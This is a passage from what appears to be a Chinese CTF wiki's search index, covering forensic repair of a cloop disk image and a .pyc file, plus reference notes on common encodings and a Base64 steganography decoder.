doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"misc/disk-memory/problem/#2018-clip","title":"2018 \u7f51\u9f0e\u676f\u7b2c\u4e00\u573a clip","text":"<p>\u901a\u8fc7010 editor \u53ef\u4ee5\u770b\u5230\u6587\u4ef6\u7684\u5934\u90e8\u5305\u542b\u6709 cloop \u5b57\u6837\uff0c\u641c\u4e86\u641c\u53d1\u73b0\u8fd9\u662f\u4e00\u4e2a\u53e4\u8001\u7684 linux \u538b\u7f29\u540e\u7684\u8bbe\u5907\uff0c\u9898\u76ee\u4e2d\u53c8\u8bf4\u8fd9\u4e2a\u8bbe\u5907\u635f\u574f\u4e86\uff0c\u6240\u4ee5\u5c31\u60f3\u529e\u6cd5\u627e\u4e00\u4e2a\u6b63\u5e38\u7684\u3002\u4e8e\u662f\u641c\u7d22\u5982\u4f55\u538b\u7f29\u5f97\u5230\u4e00\u4e2a cloop \u6587\u4ef6\uff0c\u5982\u4e0b</p> <pre><code>mkisofs -r test | create_compressed_fs - 65536 &gt; test.cloop\n</code></pre> <p>\u53c2\u8003https://github.com/KlausKnopper/cloop\uff0c\u4e8e\u662f\u538b\u7f29\u4e00\u4e2a\u6587\u4ef6\uff0c\u7136\u540e\u53d1\u73b0\u6e90\u6587\u4ef6\u6587\u4ef6\u5934\u5b58\u5728\u95ee\u9898\uff0c\u4e8e\u662f\u8fdb\u884c\u4fee\u590d\uff0c\u4ece\u800c\u8003\u8651\u5982\u4f55\u4ece cloop \u6587\u4ef6\u4e2d\u63d0\u53d6\u6587\u4ef6\uff0c\u5373\u4f7f\u7528</p> <pre><code>extract_compressed_fs test.cloop now\n</code></pre> <p>\u53c2\u8003https://manned.org/create_compressed_fs/f2f838da\u3002</p> <p>\u5f97\u5230\u4e00\u4e2a ext4 \u7c7b\u578b\u7684\u6587\u4ef6\uff0c\u8fdb\u4e00\u6b65\u60f3\u529e\u6cd5\u83b7\u53d6\u8fd9\u4e2a\u6587\u4ef6\u7cfb\u7edf\u7684\u5185\u5bb9</p> <pre><code>\u279c  clip losetup -d /dev/loop0\nlosetup: /dev/loop0: detach failed: Permission denied\n\u279c  clip sudo losetup -d /dev/loop0\n\u279c  clip sudo losetup /dev/loop0 now                                                 \nlosetup: now: failed to set up loop device: Device or resource busy\n\u279c  clip sudo losetup /dev/loop0 /home/iromise/ctf/2018/0820\u7f51\u9f0e\u676f/misc/clip/now        \nlosetup: /home/iromise/ctf/2018/0820\u7f51\u9f0e\u676f/misc/clip/now: failed to set up loop device: Device or resource busy\n\u279c  clip losetup -f           \n/dev/loop10\n\u279c  clip sudo losetup /dev/loop10 /home/iromise/ctf/2018/0820\u7f51\u9f0e\u676f/misc/clip/now\n\u279c  clip sudo mount /dev/loop10 /mnt/now\n\u279c  clip cd /mnt/now \n\u279c  now ls        \nclip-clip.png  clip-clop.png  clop-clip.png  clop-clop.jpg  flag.png\n</code></pre> <p>\u6700\u540e\u4e00\u6b65\u5c31\u662f\u4fee\u590d flag \u4e86\u3002\u5c31\u662f\u5c11\u4e86\u6587\u4ef6\u5934\u90a3\u51e0\u4e2a\u5b57\u7b26\u3002</p>"},{"location":"misc/encode/communication/","title":"\u901a\u4fe1\u9886\u57df\u5e38\u7528\u7f16\u7801","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"misc/encode/communication/#_2","title":"\u7535\u8bdd\u62e8\u53f7\u7f16\u7801","text":"<p>1-9 \u5206\u522b\u4f7f\u7528 1-9 \u4e2a\u8109\u51b2\uff0c0 \u5219\u8868\u793a\u4f7f\u7528 10 \u4e2a\u8109\u51b2\u3002</p>"},{"location":"misc/encode/communication/#morse","title":"Morse \u7f16\u7801","text":"<p>\u53c2\u89c1 \u6469\u5c14\u65af\u7f16\u7801 -\u7ef4\u57fa\u767e\u79d1\uff0c\u5bf9\u5e94\u8868\u5982\u4e0b</p> <p></p>"},{"location":"misc/encode/communication/#_3","title":"\u7279\u70b9","text":"<ul> <li>\u53ea\u6709 <code>.</code> \u548c <code>-</code>\uff1b</li> <li>\u6700\u591a 6 \u4f4d\uff1b</li> <li>\u4e5f\u53ef\u4ee5\u4f7f\u7528 <code>01</code> \u4e32\u8868\u793a\u3002</li> </ul>"},{"location":"misc/encode/communication/#_4","title":"\u5de5\u5177","text":"<ul> <li>\u6469\u5c14\u65af\u7f16\u7801\u5728\u7ebf\u8f6c\u6362</li> </ul>"},{"location":"misc/encode/communication/#_5","title":"\u9898\u76ee","text":"<ul> <li>JarvisOJ - Basec - \u300c-.-\u5b57\u7b26\u4e32\u300d</li> </ul>"},{"location":"misc/encode/communication/#_6","title":"\u6572\u51fb\u7801","text":"<p>\u6572\u51fb\u7801\uff08Tap code\uff09\u662f\u4e00\u79cd\u4ee5\u975e\u5e38\u7b80\u5355\u7684\u65b9\u5f0f\u5bf9\u6587\u672c\u4fe1\u606f\u8fdb\u884c\u7f16\u7801\u7684\u65b9\u6cd5\u3002\u56e0\u8be5\u7f16\u7801\u5bf9\u4fe1\u606f\u901a\u8fc7\u4f7f\u7528\u4e00\u7cfb\u5217\u7684\u70b9\u51fb\u58f0\u97f3\u6765\u7f16\u7801\u800c\u547d\u540d\uff0c\u6572\u51fb\u7801\u662f\u57fa\u4e8e 5 \u00d75 \u65b9\u683c\u6ce2\u5229\u6bd4\u5965\u65af\u65b9\u9635\u6765\u5b9e\u73b0\u7684\uff0c\u4e0d\u540c\u70b9\u662f\u662f\u7528 K \u5b57\u6bcd\u88ab\u6574\u5408\u5230 C \u4e2d\u3002</p> Tap Code 1 2 3 4 5 1 A B C/K D E 2 F G H I J 3 L M N O P 4 Q R S T U 5 V W X Y Z <p></p>"},{"location":"misc/encode/communication/#_7","title":"\u66fc\u5f7b\u65af\u7279\u7f16\u7801","text":"<ul> <li>\u66fc\u5f7b\u65af\u7279\u7f16\u7801 - \u7ef4\u57fa\u767e\u79d1</li> </ul>"},{"location":"misc/encode/communication/#_8","title":"\u683c\u96f7\u7f16\u7801","text":"<ul> <li>\u683c\u96f7\u7801 - \u7ef4\u57fa\u767e\u79d1</li> </ul>"},{"location":"misc/encode/computer/","title":"\u8ba1\u7b97\u673a\u76f8\u5173\u7684\u7f16\u7801","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u672c\u8282\u4ecb\u7ecd\u4e00\u4e9b\u8ba1\u7b97\u673a\u76f8\u5173\u7684\u7f16\u7801\u3002</p>"},{"location":"misc/encode/computer/#_2","title":"\u5b57\u6bcd\u8868\u7f16\u7801","text":"<ul> <li>A-Z/a-z \u5bf9\u5e94 1-26 \u6216\u8005 0-25</li> </ul>"},{"location":"misc/encode/computer/#ascii","title":"ASCII \u7f16\u7801","text":""},{"location":"misc/encode/computer/#_3","title":"\u7279\u70b9","text":"<p>\u6211\u4eec\u4e00\u822c\u4f7f\u7528\u7684 ascii \u7f16\u7801\u7684\u65f6\u5019\u91c7\u7528\u7684\u90fd\u662f\u53ef\u89c1\u5b57\u7b26\uff0c\u800c\u4e14\u4e3b\u8981\u662f\u5982\u4e0b\u5b57\u7b26</p> <ul> <li>0-9, 48-57</li> <li>A-Z, 65-90</li> <li>a-z, 97-122</li> </ul>"},{"location":"misc/encode/computer/#_4","title":"\u53d8\u5f62","text":""},{"location":"misc/encode/computer/#_5","title":"\u4e8c\u8fdb\u5236\u7f16\u7801","text":"<p>\u5c06 ascii \u7801\u5bf9\u5e94\u7684\u6570\u5b57\u6362\u6210\u4e8c\u8fdb\u5236\u8868\u793a\u5f62\u5f0f\u3002</p> <ul> <li>\u53ea\u6709 0 \u548c 1</li> <li>\u4e0d\u5927\u4e8e 8 \u4f4d\uff0c\u4e00\u822c 7 \u4f4d\u4e5f\u53ef\u4ee5\uff0c\u56e0\u4e3a\u53ef\u89c1\u5b57\u7b26\u5230 127\u3002</li> <li>\u5176\u5b9e\u662f\u53e6\u4e00\u79cd ascii \u7f16\u7801\u3002</li> </ul>"},{"location":"misc/encode/computer/#_6","title":"\u5341\u516d\u8fdb\u5236\u7f16\u7801","text":"<p>\u5c06 ascii \u7801\u5bf9\u5e94\u7684\u6570\u5b57\u6362\u6210\u5341\u516d\u8fdb\u5236\u8868\u793a\u5f62\u5f0f\u3002</p> <ul> <li>A-Z\u219241-5 A</li> <li>a-z\u219261-7 A</li> </ul>"},{"location":"misc/encode/computer/#_7","title":"\u5de5\u5177","text":"<ul> <li>jpk, ascii to number, number to ascii</li> <li>http://www.ab126.com/goju/1711.html</li> </ul>"},{"location":"misc/encode/computer/#_8","title":"\u4f8b\u5b50","text":""},{"location":"misc/encode/computer/#2018-defcon-quals-ghettohackers-throwback","title":"2018 DEFCON Quals ghettohackers: Throwback","text":"<p>\u9898\u76ee\u63cf\u8ff0\u5982\u4e0b</p> <pre><code>Anyo!e!howouldsacrificepo!icyforexecu!!onspeedthink!securityisacomm!ditytop!urintoasy!tem!\n</code></pre> <p>\u7b2c\u4e00\u76f4\u89c9\u5e94\u8be5\u662f\u6211\u4eec\u53bb\u8865\u5168\u8fd9\u4e9b\u53f9\u53f7\u5bf9\u5e94\u7684\u5185\u5bb9\uff0c\u4ece\u800c\u5f97\u5230 flag\uff0c\u4f46\u662f\u8865\u5168\u540e\u5e76\u4e0d\u884c\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u628a\u6e90\u5b57\u7b26\u4e32\u6309\u7167 <code>!</code> \u5206\u5272\uff0c\u7136\u540e\u5b57\u7b26\u4e32\u957f\u5ea6 1 \u5bf9\u5e94\u5b57\u6bcda\uff0c\u957f\u5ea6 2 \u5bf9\u5e94\u5b57\u6bcd b\uff0c\u4ee5\u6b64\u7c7b\u63a8</p> <pre><code>ori = 'Anyo!e!howouldsacrificepo!icyforexecu!!onspeedthink!securityisacomm!ditytop!urintoasy!tem!'\nsp = ori.split('!')\nprint repr(''.join(chr(97 + len(s) - 1) for s in sp))\n</code></pre> <p>\u8fdb\u800c\u53ef\u4ee5\u5f97\u5230\uff0c\u8fd9\u91cc\u540c\u65f6\u9700\u8981\u5047\u8bbe 0 \u4e2a\u5b57\u7b26\u4e3a\u7a7a\u683c\u3002\u56e0\u4e3a\u8fd9\u6b63\u597d\u4f7f\u5f97\u539f\u6587\u53ef\u8bfb\u3002</p> <pre><code>dark logic\n</code></pre>"},{"location":"misc/encode/computer/#_9","title":"\u9898\u76ee","text":"<ul> <li>Jarvis-basic-\u5fb7\u519b\u7684\u5bc6\u7801</li> </ul>"},{"location":"misc/encode/computer/#base","title":"Base \u7f16\u7801","text":"<p>base xx \u4e2d\u7684 xx \u8868\u793a\u7684\u662f\u91c7\u7528\u591a\u5c11\u4e2a\u5b57\u7b26\u8fdb\u884c\u7f16\u7801\uff0c\u6bd4\u5982\u8bf4 base64 \u5c31\u662f\u91c7\u7528\u4ee5\u4e0b 64 \u4e2a\u5b57\u7b26\u7f16\u7801\uff0c\u7531\u4e8e 2 \u7684 6 \u6b21\u65b9\u7b49\u4e8e 64\uff0c\u6240\u4ee5\u6bcf 6 \u4e2a\u6bd4\u7279\u4e3a\u4e00\u4e2a\u5355\u5143\uff0c\u5bf9\u5e94\u67d0\u4e2a\u53ef\u6253\u5370\u5b57\u7b26\u30023\u4e2a\u5b57\u8282\u5c31\u6709 24 \u4e2a\u6bd4\u7279\uff0c\u5bf9\u5e94\u4e8e 4 \u4e2a Base64 \u5355\u5143\uff0c\u5373 3 \u4e2a\u5b57\u8282\u9700\u8981\u7528 4 \u4e2a\u53ef\u6253\u5370\u5b57\u7b26\u6765\u8868\u793a\u3002\u5b83\u53ef\u7528\u6765\u4f5c\u4e3a\u7535\u5b50\u90ae\u4ef6\u7684\u4f20\u8f93\u7f16\u7801\u3002\u5728 Base64 \u4e2d\u7684\u53ef\u6253\u5370\u5b57\u7b26\u5305\u62ec\u5b57\u6bcd A-Z\u3001a-z\u3001\u6570\u5b57 0-9\uff0c\u8fd9\u6837\u5171\u6709 62 \u4e2a\u5b57\u7b26\uff0c\u6b64\u5916\u4e24\u4e2a\u53ef\u6253\u5370\u7b26\u53f7\u5728\u4e0d\u540c\u7684\u7cfb\u7edf\u4e2d\u800c\u4e0d\u540c\u3002</p> <p></p> <p>\u5177\u4f53\u4ecb\u7ecd\u53c2\u89c1 Base64 - \u7ef4\u57fa\u767e\u79d1\u3002</p> <p>\u7f16\u7801 man</p> <p></p> <p>\u5982\u679c\u8981\u7f16\u7801\u7684\u5b57\u8282\u6570\u4e0d\u80fd\u88ab 3 \u6574\u9664\uff0c\u6700\u540e\u4f1a\u591a\u51fa 1 \u4e2a\u6216 2 \u4e2a\u5b57\u8282\uff0c\u90a3\u4e48\u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u7684\u65b9\u6cd5\u8fdb\u884c\u5904\u7406\uff1a\u5148\u4f7f\u7528 0 \u503c\u5728\u672b\u5c3e\u8865\u8db3\uff0c\u4f7f\u5176\u80fd\u591f\u88ab 3 \u6574\u9664\uff0c\u7136\u540e\u518d\u8fdb\u884c base64 \u7684\u7f16\u7801\u3002\u5728\u7f16\u7801\u540e\u7684 base64 \u6587\u672c\u540e\u52a0\u4e0a\u4e00\u4e2a\u6216\u4e24\u4e2a <code>=</code> \u53f7\uff0c\u4ee3\u8868\u8865\u8db3\u7684\u5b57\u8282\u6570\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5f53\u6700\u540e\u5269\u4f59\u4e00\u4e2a\u516b\u4f4d\u5b57\u8282\uff08\u4e00\u4e2a byte\uff09\u65f6\uff0c\u6700\u540e\u4e00\u4e2a 6 \u4f4d\u7684 base64 \u5b57\u8282\u5757\u6709\u56db\u4f4d\u662f 0 \u503c\uff0c\u6700\u540e\u9644\u52a0\u4e0a\u4e24\u4e2a\u7b49\u53f7\uff1b\u5982\u679c\u6700\u540e\u5269\u4f59\u4e24\u4e2a\u516b\u4f4d\u5b57\u8282\uff082 \u4e2a byte\uff09\u65f6\uff0c\u6700\u540e\u4e00\u4e2a 6 \u4f4d\u7684 base \u5b57\u8282\u5757\u6709\u4e24\u4f4d\u662f 0 \u503c\uff0c\u6700\u540e\u9644\u52a0\u4e00\u4e2a\u7b49\u53f7\u3002\u53c2\u8003\u4e0b\u8868\uff1a</p> <p></p> <p>\u7531\u4e8e\u89e3\u7801\u65f6\u8865\u4f4d\u7684 0 \u5e76\u4e0d\u53c2\u4e0e\u8fd0\u7b97\uff0c\u53ef\u4ee5\u5728\u8be5\u5904\u9690\u85cf\u4fe1\u606f\u3002</p> <p>\u4e0e base64 \u7c7b\u4f3c\uff0cbase32 \u4f7f\u7528 32 \u4e2a\u53ef\u89c1\u5b57\u7b26\u8fdb\u884c\u7f16\u7801\uff0c2 \u7684 5 \u6b21\u65b9\u4e3a 32\uff0c\u6240\u4ee5\u6bcf 5 bit \u4e3a 1 \u4e2a\u5206\u7ec4\u30025 \u5b57\u8282\u4e3a 40 bit\uff0c\u5bf9\u5e94\u4e8e 8 \u4e2a base32 \u5206\u7ec4\uff0c\u5373 5 \u4e2a\u5b57\u8282\u7528 8 \u4e2a base32 \u4e2d\u5b57\u7b26\u6765\u8868\u793a\u3002\u4f46\u5982\u679c\u4e0d\u8db3 5 \u4e2a\u5b57\u8282\uff0c\u5219\u4f1a\u5148\u5bf9\u7b2c\u4e00\u4e2a\u4e0d\u8db3 5 bit \u7684\u5206\u7ec4\u7528 0 \u8865\u8db3\u4e86 5 bit \uff0c\u5bf9\u540e\u9762\u5269\u4f59\u5206\u7ec4\u5168\u90e8\u4f7f\u7528 \u201c=\u201d \u586b\u5145\uff0c\u76f4\u5230\u8865\u6ee1 5 \u4e2a\u5b57\u8282\u3002\u7531\u6b64\u53ef\u77e5\uff0cbase32 \u6700\u591a\u53ea\u6709 6 \u4e2a\u7b49\u53f7\u51fa\u73b0\u3002\u4f8b\u5982\uff1a</p> <p></p>"},{"location":"misc/encode/computer/#_10","title":"\u7279\u70b9","text":"<ul> <li>base64 \u7ed3\u5c3e\u53ef\u80fd\u4f1a\u6709 <code>=</code> \u53f7\uff0c\u4f46\u6700\u591a\u6709 2 \u4e2a</li> <li>base32 \u7ed3\u5c3e\u53ef\u80fd\u4f1a\u6709 <code>=</code> \u53f7\uff0c\u4f46\u6700\u591a\u6709 6 \u4e2a</li> <li>\u6839\u636e base \u7684\u4e0d\u540c\uff0c\u5b57\u7b26\u96c6\u4f1a\u6709\u6240\u9650\u5236</li> <li>\u6709\u53ef\u80fd\u9700\u8981\u81ea\u5df1\u52a0\u7b49\u53f7</li> <li>=\u4e5f\u5c31\u662f 3D</li> <li>\u66f4\u591a\u5185\u5bb9\u8bf7\u53c2\u89c1 base rfc</li> </ul>"},{"location":"misc/encode/computer/#_11","title":"\u5de5\u5177","text":"<ul> <li>http://www1.tc711.com/tool/BASE64.htm</li> <li>python \u5e93\u51fd\u6570</li> <li>\u8bfb\u53d6\u9690\u5199\u4fe1\u606f\u811a\u672c</li> </ul>"},{"location":"misc/encode/computer/#_12","title":"\u4f8b\u5b50","text":"<p>\u9898\u76ee\u63cf\u8ff0\u53c2\u89c1 <code>ctf-challenge</code>\u4e2d misc \u5206\u7c7b\u7684 base64-stego \u76ee\u5f55\u4e2d\u7684 data.txt \u6587\u4ef6\u3002</p> <p>\u4f7f\u7528\u811a\u672c\u8bfb\u53d6\u9690\u5199\u4fe1\u606f\u3002</p> <pre><code>import base64\n\ndef deStego(stegoFile):\n    b64table = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"\n    with open(stegoFile,'r') as stegoText:\n        message = \"\"\n        for line in stegoText:\n            try:\n                text = line[line.index(\"=\") - 1:-1]\n                message += \"\".join([ bin( 0 if i == '=' else b64table.find(i))[2:].zfill(6) for i in text])[2 if text.count('=') ==2 else 4:6]  \n            except:\n                pass\n    return \"\".join([chr(int(message[i:i+8],2)) for i in range(0,len(message),8)])\n\nprint(deStego(\"text.txt\"))\n</code></pre> <p>\u8f93\u51fa:</p> <pre><code>     flag{BASE64_i5_amaz1ng}\n</code></pre>"},{"location":"misc/encode/computer/#_13","title":"\u9898\u76ee","text":""},{"location":"misc/encode/computer/#_14","title":"\u970d\u592b\u66fc\u7f16\u7801","text":"<p>\u53c2\u89c1 \u970d\u592b\u66fc\u7f16\u7801\u3002</p>"},{"location":"misc/encode/computer/#xxencoding","title":"XXencoding","text":"<p>XXencode \u5c06\u8f93\u5165\u6587\u672c\u4ee5\u6bcf\u4e09\u4e2a\u5b57\u8282\u4e3a\u5355\u4f4d\u8fdb\u884c\u7f16\u7801\u3002\u5982\u679c\u6700\u540e\u5269\u4e0b\u7684\u8d44\u6599\u5c11\u4e8e\u4e09\u4e2a\u5b57\u8282\uff0c\u4e0d\u591f\u7684\u90e8\u4efd\u7528\u96f6\u8865\u9f50\u3002\u8fd9\u4e09\u4e2a\u5b57\u8282\u5171\u6709 24 \u4e2a Bit\uff0c\u4ee5 6bit \u4e3a\u5355\u4f4d\u5206\u4e3a 4 \u4e2a\u7ec4\uff0c\u6bcf\u4e2a\u7ec4\u4ee5\u5341\u8fdb\u5236\u6765\u8868\u793a\u6240\u51fa\u73b0\u7684\u6570\u503c\u53ea\u4f1a\u843d\u5728 0 \u5230 63 \u4e4b\u95f4\u3002\u4ee5\u6240\u5bf9\u5e94\u503c\u7684\u4f4d\u7f6e\u5b57\u7b26\u4ee3\u66ff\u3002</p> <pre><code>           1         2         3         4         5         6\n 0123456789012345678901234567890123456789012345678901234567890123\n |         |         |         |         |         |         |\n +-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\n</code></pre> <p>\u5177\u4f53\u4fe1\u606f\u53c2\u89c1\u7ef4\u57fa\u767e\u79d1</p>"},{"location":"misc/encode/computer/#_15","title":"\u7279\u70b9","text":"<ul> <li>\u53ea\u6709\u6570\u5b57\uff0c\u5927\u5c0f\u5199\u5b57\u6bcd</li> <li>+\u53f7\uff0c-\u53f7\u3002</li> </ul>"},{"location":"misc/encode/computer/#_16","title":"\u5de5\u5177","text":"<ul> <li>http://web.chacuo.net/charsetxxencode</li> </ul>"},{"location":"misc/encode/computer/#_17","title":"\u9898\u76ee","text":""},{"location":"misc/encode/computer/#url","title":"URL \u7f16\u7801","text":"<p>\u53c2\u89c1 URL \u7f16\u7801 - \u7ef4\u57fa\u767e\u79d1\u3002</p>"},{"location":"misc/encode/computer/#_18","title":"\u7279\u70b9","text":"<ul> <li>\u5927\u91cf\u7684\u767e\u5206\u53f7</li> </ul>"},{"location":"misc/encode/computer/#_19","title":"\u5de5\u5177","text":""},{"location":"misc/encode/computer/#_20","title":"\u9898\u76ee","text":""},{"location":"misc/encode/computer/#unicode","title":"Unicode \u7f16\u7801","text":"<p>\u53c2\u89c1 Unicode - \u7ef4\u57fa\u767e\u79d1\u3002</p> <p>\u6ce8\u610f\uff0c\u5b83\u6709\u56db\u79cd\u8868\u73b0\u5f62\u5f0f\u3002</p>"},{"location":"misc/encode/computer/#_21","title":"\u4f8b\u5b50","text":"<p>\u6e90\u6587\u672c\uff1a <code>The</code></p> <p>&amp;#x [Hex]:  <code>&amp;#x0054;&amp;#x0068;&amp;#x0065;</code></p> <p>&amp;# [Decimal]:  <code>&amp;#00084;&amp;#00104;&amp;#00101;</code></p> <p>\\U [Hex]:  <code>\\U0054\\U0068\\U0065</code></p> <p>\\U+ [Hex]:  <code>\\U+0054\\U+0068\\U+0065</code></p>"},{"location":"misc/encode/computer/#_22","title":"\u5de5\u5177","text":""},{"location":"misc/encode/computer/#_23","title":"\u9898\u76ee","text":""},{"location":"misc/encode/computer/#html","title":"HTML \u5b9e\u4f53\u7f16\u7801","text":""},{"location":"misc/encode/modern/","title":"\u73b0\u5b9e\u4e16\u754c\u4e2d\u5e38\u7528\u7684\u7f16\u7801","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"misc/encode/modern/#_2","title":"\u6761\u5f62\u7801","text":"<ul> <li>\u5bbd\u5ea6\u4e0d\u7b49\u7684\u591a\u4e2a\u9ed1\u6761\u548c\u7a7a\u767d\uff0c\u6309\u7167\u4e00\u5b9a\u7684\u7f16\u7801\u89c4\u5219\u6392\u5217\uff0c\u7528\u4ee5\u8868\u8fbe\u4e00\u7ec4\u4fe1\u606f\u7684\u56fe\u5f62\u6807\u8bc6\u7b26</li> <li>\u56fd\u9645\u6807\u51c6</li> <li>EAN-13 \u5546\u54c1\u6807\u51c6\uff0c13 \u4f4d\u6570\u5b57</li> <li>Code-39\uff1a39 \u5b57\u7b26</li> <li>Code-128\uff1a128 \u5b57\u7b26</li> <li>\u6761\u5f62\u7801\u5728\u7ebf\u8bc6\u522b</li> </ul>"},{"location":"misc/encode/modern/#_3","title":"\u4e8c\u7ef4\u7801","text":"<ul> <li>\u7528\u67d0\u79cd\u7279\u5b9a\u51e0\u4f55\u56fe\u5f62\u6309\u4e00\u5b9a\u89c4\u5f8b\u5728\u5e73\u9762\u5206\u6b65\u7684\u9ed1\u767d\u76f8\u95f4\u7684\u56fe\u5f62\u8bb0\u5f55\u6570\u636e\u7b26\u53f7\u4fe1\u606f</li> <li>\u5806\u53e0\u5f0f / \u884c\u6392\u5f0f\u4e8c\u7ef4\u7801\uff1aCode 16 k\u3001Code 49\u3001PDF417</li> <li> <p>\u77e9\u9635\u5f0f\u4e8c\u7ef4\u7801\uff1aQR CODE</p> <p></p> <p></p> </li> </ul>"},{"location":"misc/other/pyc/","title":"pyc\u6587\u4ef6","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"misc/other/pyc/#code-object","title":"code object","text":"<p>\u5728\u6211\u4eec\u5bfc\u5165 python \u811a\u672c\u65f6\u5728\u76ee\u5f55\u4e0b\u4f1a\u751f\u6210\u4e2a\u4e00\u4e2a\u76f8\u5e94\u7684 pyc \u6587\u4ef6\uff0c\u662fpythoncodeobj\u7684\u6301\u4e45\u5316\u50a8\u5b58\u5f62\u5f0f,\u52a0\u901f\u4e0b\u4e00\u6b21\u7684\u88c5\u8f7d\u3002</p>"},{"location":"misc/other/pyc/#_1","title":"\u6587\u4ef6\u7ed3\u6784","text":"<p>pyc\u6587\u4ef6\u7531\u4e09\u5927\u90e8\u5206\u7ec4\u6210</p> <ul> <li> <p>\u6700\u5f00\u59cb4\u4e2a\u5b57\u8282\u662f\u4e00\u4e2aMaigc int, \u6807\u8bc6\u6b64pyc\u7684\u7248\u672c\u4fe1\u606f</p> </li> <li> <p>\u63a5\u4e0b\u6765\u56db\u4e2a\u5b57\u8282\u8fd8\u662f\u4e2aint,\u662fpyc\u4ea7\u751f\u7684\u65f6\u95f4</p> </li> <li> <p>\u5e8f\u5217\u5316\u7684 PyCodeObject,\u7ed3\u6784\u53c2\u7167include/code.h,\u5e8f\u5217\u5316\u65b9\u6cd5python/marshal</p> </li> </ul> <p>pyc\u5b8c\u6574\u7684\u6587\u4ef6\u89e3\u6790\u53ef\u4ee5\u53c2\u7167</p> <ul> <li>Python\u7a0b\u5e8f\u7684\u6267\u884c\u539f\u7406</li> <li>PYC\u6587\u4ef6\u683c\u5f0f\u5206\u6790</li> </ul> <p>\u5173\u4e8eco_code</p> <p>\u4e00\u4e32\u4e8c\u8fdb\u5236\u6d41,\u4ee3\u8868\u7740\u6307\u4ee4\u5e8f\u5217,\u5177\u4f53\u5b9a\u4e49\u5728include/opcode.h\u4e2d,\u4e5f\u53ef\u4ee5\u53c2\u7167python opcodes\u3002</p> <p>\u7531</p> <ul> <li> <p>\u6307\u4ee4(opcode),\u5206\u4e3a\u6709\u53c2\u6570\u548c\u65e0\u53c2\u6570\u4e24\u79cd,\u4ee5 https://github.com/python/cpython/blob/fc7df0e664198cb05cafd972f190a18ca422989c/Include/opcode.h#L69 \u5212\u5206</p> </li> <li> <p>\u53c2\u6570(oparg)</p> </li> </ul> <p>python3.6 \u4ee5\u4e0a\u53c2\u6570\u6c38\u8fdc\u53601\u5b57\u8282,\u5982\u679c\u6307\u4ee4\u4e0d\u5e26\u53c2\u6570\u7684\u8bdd\u5219\u4ee5<code>0x00</code>\u4ee3\u66ff,\u5728\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u88ab\u89e3\u91ca\u5668\u5ffd\u7565,\u4e5f\u662fStegosaurus\u6280\u672f\u539f\u7406;\u800c\u4f4e\u4e8epython3.5\u7684\u7248\u672c\u4e2d\u6307\u4ee4\u4e0d\u5e26\u53c2\u6570\u7684\u8bdd\u5374\u6ca1\u6709<code>0x00</code>\u586b\u5145</p>"},{"location":"misc/other/pyc/#_2","title":"\u4f8b\u9898","text":"<p>Hackover CTF 2016 : img-enc</p> <p>\u9996\u5148\u5c1d\u8bd5pycdc\u53cd\u7f16\u8bd1\u5931\u8d25</p> <pre><code># Source Generated with Decompyle++\n# File: imgenc.pyc (Python 2.7)\n\nimport sys\nimport numpy as np\nfrom scipy.misc import imread, imsave\n\ndef doit(input_file, output_file, f):\nUnsupported opcode: STOP_CODE\n    img = imread(input_file, flatten = True)\n    img /= 255\n    size = img.shape[0]\n# WARNING: Decompyle incomplete\n</code></pre> <p>\u6ce8\u610f\u5230\u662fpython2.7,\u4e5f\u5c31\u662f\u8bf4\u6307\u4ee4\u5e8f\u5217\u5171\u53601\u5b57\u8282\u62163\u5b57\u8282(\u6709\u53c2\u6570\u65e0\u53c2\u6570)</p> <p>\u4f7f\u7528pcads\u5f97\u5230</p> <pre><code>imgenc.pyc (Python 2.7)\n...\n                67      STOP_CODE               68      STOP_CODE               69      BINARY_DIVIDE           70      JUMP_IF_TRUE_OR_POP     5\n                73      LOAD_CONST              3: 0\n                76      LOAD_CONST              3: 0\n                79      BINARY_DIVIDE       </code></pre> <p>\u5b9a\u4f4d\u5230\u51fa\u9519\u7684\u5730\u65b9,\u89c2\u5bdf\u53d1\u73b0 <code>LOAD_CONST LOAD_CONST BINARY_DIVIDE STORE_FAST opcodes (64 03 00 64 03 00 15 7d 05 00)</code>\u88ab\u7834\u574f\u4e86,\u6839\u636e\u4e0a\u4e0b\u6587\u7ebf\u7d22\u4fee\u590d\u540e</p> <pre><code>00000120  64 04 00 6b 00 00 72 ce  00 64 03 00 64 03 00 15  |d..k..r..d..d...|\n00000130  7d 05 00 64 03 00 64 03  00 15 7d 05 00 64 03 00  |}..d..d...}..d..|\n00000140  64 03 00 15 7d 05 00 64  03 00 64 03 00 15 7d 05  |d...}..d..d...}.|\n00000150  00 64 03 00 64 03 00 15  7d 05 00 64 03 00 64 03  |.d..d...}..d..d.|\n00000160  00 15 7d 05 00 64 03 00  64 03 00 15 7d 05 00 64  |..}..d..d...}..d|\n00000170  03 00 64 03 00 15 7d 05  00 64 03 00 64 03 00 15  |..d...}..d..d...|\n00000180  7d 05 00 64 03 00 64 03  00 15 7d 05 00 64 03 00  |}..d..d...}..d..|\n00000190  64 03 00 15 7d 05 00 64  03 00 64 03 00 15 7d 05  |d...}..d..d...}.|\n000001a0  00 64 03 00 64 03 00 15  7d 05 00 64 03 00 64 03  |.d..d...}..d..d.|\n000001b0  00 15 7d 05 00 64 03 00  64 03 00 15 7d 05 00 6e  |..}..d..d...}..n|\n</code></pre> <p>\u63a5\u4e0b\u6765\u6839\u636e\u4fee\u590d\u597d\u7684python\u6e90\u4ee3\u7801\u5f97\u5230flag\u5373\u53ef</p> <p>\u5ef6\u4f38:</p> <ul> <li>\u9898\u76ee: 